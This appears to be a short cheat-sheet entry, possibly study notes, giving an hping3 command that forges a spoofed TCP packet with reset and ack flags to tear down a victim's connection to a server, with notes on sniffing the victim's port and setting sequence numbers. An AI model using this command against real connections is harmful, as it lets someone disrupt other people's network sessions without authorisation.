## Hping3
```
hping3 <target_server> -s <src_port> -p <des_port> -a <spoof_ip> -R -A -M <syn_num> -L <ack_num>
```

> -s <src_port> : source port of victim , see by sniff
> -p <des_port> : port of server , victim connected to
> -a <spoof_ip> : ip of victim to spoof in packet
> -R : reset flag
> -A : Ack
> -M : syn number that server expecting next by victim
> -L : ack number sent by server